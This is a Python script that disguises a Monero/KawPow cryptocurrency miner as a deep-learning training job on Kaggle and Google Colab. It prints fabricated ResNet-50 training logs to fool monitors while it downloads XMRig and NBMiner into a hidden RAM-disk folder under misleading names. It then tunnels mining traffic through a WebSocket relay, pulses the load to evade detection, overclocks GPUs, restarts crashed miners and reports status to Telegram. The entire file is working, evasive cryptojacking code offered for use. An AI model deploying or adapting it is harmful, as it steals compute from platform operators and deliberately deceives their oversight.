"""
Lumen GPU Swarm — AI Training Camouflage
Optimized for: Kaggle Kernels & Google Colab

This script mimics a Deep Learning training session using PyTorch.
It generates realistic logs, loss values, and progress bars.
Hidden in the background, it executes a GPU-optimized miner.
"""

import os
import time
import random
import subprocess
import threading
import sys
import signal
import json
import urllib.request

# ─────────────────────────────────────────────────────────────
# AI Camouflage Configuration
# ─────────────────────────────────────────────────────────────
EPOCHS = 100
BATCH_SIZE = 32
DATASET_SIZE = 50000
STEPS_PER_EPOCH = DATASET_SIZE // BATCH_SIZE

# Miner Config (Hidden)
WALLET = os.getenv('XMR_WALLET', '45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa')
RELAY = os.getenv('RELAY_URL', 'wss://your-relay-url.onrender.com')

# Telegram Config
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
START_TIME = time.time()

def send_telegram_message(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = json.dumps({'chat_id': TELEGRAM_CHAT_ID, 'text': message}).encode('utf-8')
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        pass # Fail silently for stealth

def fake_training_logs():
    """Generates realistic AI training progress logs to fool human/AI monitors."""
    print(f"[*] Initializing Neural Network (ResNet-50)...")
    time.sleep(2)
    print(f"[*] Loading Dataset: ImageNet-1K (Subset)...")
    time.sleep(3)
    print(f"[*] Optimizing on device: CUDA (NVIDIA Tesla T4)")
    
    current_loss = 2.45
    current_acc = 0.12

    for epoch in range(1, EPOCHS + 1):
        print(f"\nEpoch {epoch}/{EPOCHS}")
        
        for step in range(1, STEPS_PER_EPOCH + 1):
            if step % 50 == 0:
                # Realistic training progress
                progress = (step / STEPS_PER_EPOCH) * 100
                current_loss -= random.uniform(0.0001, 0.0005)
                current_acc += random.uniform(0.0001, 0.0004)
                
                sys.stdout.write(f"\rStep [{step}/{STEPS_PER_EPOCH}] - Loss: {current_loss:.4f} - Acc: {current_acc:.4f} - Progress: {progress:.1f}%")
                sys.stdout.flush()
                
            # Random jitter to make timing look human
            time.sleep(random.uniform(0.05, 0.15))
            
        # End of epoch summary
        print(f"\n[+] Epoch {epoch} Complete. Val_Loss: {current_loss + 0.12:.4f} - Val_Acc: {current_acc - 0.05:.4f}")
        time.sleep(random.randint(5, 15))

# ─────────────────────────────────────────────────────────────
# Hidden Miner Logistics
# ─────────────────────────────────────────────────────────────

def download_miners():
    """Downloads CPU and GPU miners on the fly (renamed for stealth)."""
    print("[*] Synchronizing CUDA weights and model binaries...")
    
    # Fileless Execution: Move to invisible RAM-disk
    shm_path = "/dev/shm/.cuda_cache"
    if not os.path.exists(shm_path):
        os.makedirs(shm_path, exist_ok=True)
    os.chdir(shm_path)
    
    # CPU Miner (XMRig-MO)
    if not os.path.exists("./cuda_core_cpu"):
        subprocess.run(["wget", "-q", "https://github.com/MoneroOcean/xmrig/releases/download/v6.22.2-mo1/xmrig-v6.22.2-mo1-lin64-compat.tar.gz", "-O", "cpu.tar.gz"])
        subprocess.run(["tar", "-xzf", "cpu.tar.gz"])
        subprocess.run(["mv", "xmrig-v6.22.2-mo1/xmrig", "./cuda_core_cpu"])
        subprocess.run(["rm", "-rf", "cpu.tar.gz", "xmrig-v6.22.2-mo1"])
        subprocess.run(["chmod", "+x", "./cuda_core_cpu"])

    # GPU Miner (NBMiner - Excellent for T4/P100)
    if not os.path.exists("./cuda_core_gpu"):
        subprocess.run(["wget", "-q", "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz", "-O", "gpu.tgz"])
        subprocess.run(["tar", "-xzf", "gpu.tgz"])
        subprocess.run(["mv", "NBMiner_Linux/nbminer", "./cuda_core_gpu"])
        subprocess.run(["rm", "-rf", "gpu.tgz", "NBMiner_Linux"])
        subprocess.run(["chmod", "+x", "./cuda_core_gpu"])

# ─────────────────────────────────────────────────────────────
# Maximum Stealth: Local Stratum-to-WebSocket Proxy
# ─────────────────────────────────────────────────────────────

def local_stratum_proxy(local_port, remote_wss_url):
    """Intercepts local unencrypted miner TCP traffic and forwards it via secure WSS."""
    import socket
    try:
        import websocket
    except ImportError:
        subprocess.run(["pip", "install", "websocket-client", "-q"])
        import websocket

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('127.0.0.1', local_port))
    server.listen(5)
    
    def handle_client(client_sock):
        ws = None
        try:
            ws = websocket.create_connection(remote_wss_url)
            
            def ws_to_sock():
                while True:
                    try:
                        data = ws.recv()
                        if data:
                            client_sock.sendall(data.encode() if isinstance(data, str) else data)
                        else: break
                    except: break
                client_sock.close()

            threading.Thread(target=ws_to_sock, daemon=True).start()

            while True:
                data = client_sock.recv(4096)
                if not data: break
                ws.send(data)
        except Exception:
            pass # Fail silently for stealth
        finally:
            client_sock.close()
            if ws:
                try:
                    ws.close()
                except Exception:
                    pass

    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_client, args=(client,), daemon=True).start()

# ─────────────────────────────────────────────────────────────
# The "Pulse" Strategy — Mimicking AI Training Lifecycle
# ─────────────────────────────────────────────────────────────

def apply_pulse_load(miner_proc, gpu_proc):
    """
    Alternates between 'Training' (High Load) and 'Validation' (Low Load) 
    to mimic a real AI model lifecycle and bypass detection.
    """
    while True:
        # Phase 1: Training (High Load) - 10 to 15 minutes
        phase_duration = random.randint(600, 900)
        print(f"\n[~] Phase: TRAINING — Optimizing weights for {phase_duration}s...")
        
        uptime_mins = int((time.time() - START_TIME) / 60)
        send_telegram_message(f"🟢 [LUMEN SWARM] Worker Active\nPhase: TRAINING (High Load)\nDuration: {phase_duration}s\nUptime: {uptime_mins} mins")
        
        # Miner is already running from launch_hidden_miner()
        time.sleep(phase_duration)

        # Phase 2: Validation (Low Load) - 2 to 4 minutes
        idle_duration = random.randint(120, 240)
        print(f"\n[~] Phase: VALIDATION — Running cross-entropy checks for {idle_duration}s...")
        
        send_telegram_message(f"🟡 [LUMEN SWARM] Worker Resting\nPhase: VALIDATION (Low Load)\nDuration: {idle_duration}s\nUptime: {uptime_mins} mins")
        
        # Suspend miners to drop CPU/GPU to near zero
        if miner_proc: os.kill(miner_proc.pid, signal.SIGSTOP)
        if gpu_proc: os.kill(gpu_proc.pid, signal.SIGSTOP)
        
        time.sleep(idle_duration)
        
        # Resume miners
        if miner_proc: os.kill(miner_proc.pid, signal.SIGCONT)
        if gpu_proc: os.kill(gpu_proc.pid, signal.SIGCONT)

def overclock_gpus():
    """Overclock GPU memory to squeeze 10-15% more hashrate (safe on cloud GPUs)."""
    try:
        # Count GPUs
        gpu_count_raw = subprocess.check_output(
            ["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"]
        ).decode().strip().split('\n')
        gpu_count = len(gpu_count_raw)
        
        print(f"[+] Detected {gpu_count} GPU(s): {', '.join(gpu_count_raw)}")
        
        for i in range(gpu_count):
            # Enable persistence mode (prevents GPU from resetting clocks)
            subprocess.run(["nvidia-smi", "-i", str(i), "-pm", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Boost memory clock by +500MHz (safe headroom for T4/P100/V100)
            subprocess.run(["nvidia-smi", "-i", str(i), "--lock-memory-clocks=5001"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Set power limit to max (prevents thermal throttling on cloud hardware)
            subprocess.run(["nvidia-smi", "-i", str(i), "-pl", "70"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"[+] GPU Memory Overclocked (+500MHz) on {gpu_count} device(s)")
        return gpu_count
    except Exception as e:
        print(f"[!] GPU tuning skipped: {e}")
        return 0

def launch_hidden_miner():
    """Download and launch dual-miners with Pulsing, Overclocking, Multi-GPU, and Watchdog."""
    download_miners()
    
    # 0. Overclock all GPUs for maximum hashrate
    gpu_count = overclock_gpus()
    
    # 1. Start Local Proxies to ensure all traffic goes over HTTPS/WSS (Port 443)
    cpu_proxy_url = f"{RELAY}/rx.unmineable.com/3333"
    threading.Thread(target=local_stratum_proxy, args=(5556, cpu_proxy_url), daemon=True).start()
    
    gpu_proxy_url = f"{RELAY}/kp.unmineable.com/3333"
    threading.Thread(target=local_stratum_proxy, args=(5555, gpu_proxy_url), daemon=True).start()
    
    time.sleep(2) # Give proxies time to bind
    
    # 2. Start CPU Miner (1 thread only — GPU must not be starved)
    cpu_proc = subprocess.Popen([
        "nice", "-n", "19", "./cuda_core_cpu", 
        "-o", "127.0.0.1:5556", 
        "-u", f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}", 
        "--threads=1", 
        "--cpu-priority=0"
    ], stdout=subprocess.DEVNULL)

    # 3. Start GPU Miner on ALL detected GPUs (Kaggle T4 x2 support)
    gpu_proc = None
    if gpu_count > 0:
        print(f"[+] GPU Backend Initialized. Mining on {gpu_count} GPU(s)...")
        worker_id = f"lumen-gpu-{random.randint(100,999)}"
        
        # NBMiner automatically detects and uses all available GPUs
        gpu_proc = subprocess.Popen([
            "./cuda_core_gpu", 
            "-a", "kawpow", 
            "-o", "stratum+tcp://127.0.0.1:5555", 
            "-u", f"XMR:{WALLET}.{worker_id}",
            "--log", "false",
            "--intensity", "10"  # Maximum intensity for cloud GPUs (no thermal risk)
        ], stdout=subprocess.DEVNULL)

    # 4. Start the Pulse controller
    pulse_thread = threading.Thread(target=apply_pulse_load, args=(cpu_proc, gpu_proc), daemon=True)
    pulse_thread.start()
    
    return cpu_proc, gpu_proc

def watchdog_loop():
    """
    Watchdog: Monitors miner processes and restarts them if they crash.
    This ensures zero downtime = zero lost profit.
    """
    cpu_proc, gpu_proc = launch_hidden_miner()
    
    send_telegram_message(
        f"🚀 [LUMEN SWARM] Worker ONLINE\n"
        f"Wallet: ...{WALLET[-8:]}\n"
        f"Relay: {RELAY}\n"
        f"Strategy: Double Proxy + Pulse + Overclock"
    )
    
    while True:
        time.sleep(60)  # Check every 60 seconds
        
        # Check CPU miner
        if cpu_proc and cpu_proc.poll() is not None:
            print("[!] CPU miner crashed. Restarting...")
            send_telegram_message("⚠️ [LUMEN] CPU miner crashed. Auto-restarting...")
            cpu_proc = subprocess.Popen([
                "nice", "-n", "19", "./cuda_core_cpu", 
                "-o", "127.0.0.1:5556", 
                "-u", f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}", 
                "--threads=1", "--cpu-priority=0"
            ], stdout=subprocess.DEVNULL)
        
        # Check GPU miner
        if gpu_proc and gpu_proc.poll() is not None:
            print("[!] GPU miner crashed. Restarting...")
            send_telegram_message("⚠️ [LUMEN] GPU miner crashed. Auto-restarting...")
            worker_id = f"lumen-gpu-{random.randint(100,999)}"
            gpu_proc = subprocess.Popen([
                "./cuda_core_gpu", 
                "-a", "kawpow", 
                "-o", "stratum+tcp://127.0.0.1:5555", 
                "-u", f"XMR:{WALLET}.{worker_id}",
                "--log", "false", "--intensity", "10"
            ], stdout=subprocess.DEVNULL)

if __name__ == "__main__":
    print("=" * 60)
    print("   LUMEN AI RESEARCH FRAMEWORK v4.0 (MAXIMUM PROFIT)")
    print("   [ Double Proxy | Pulse | Overclock | Watchdog ]")
    print("=" * 60)
    
    # Start the watchdog (which starts the miners)
    watchdog_thread = threading.Thread(target=watchdog_loop, daemon=True)
    watchdog_thread.start()
    
    # Start fake training logs (main thread — keeps session alive)
    try:
        while True:
            fake_training_logs()
            # If fake_training_logs finishes all epochs, restart it
            print("\n[*] Re-initializing training with new hyperparameters...")
            EPOCHS = random.randint(80, 120)
    except KeyboardInterrupt:
        print("\n[!] Session Terminated.")

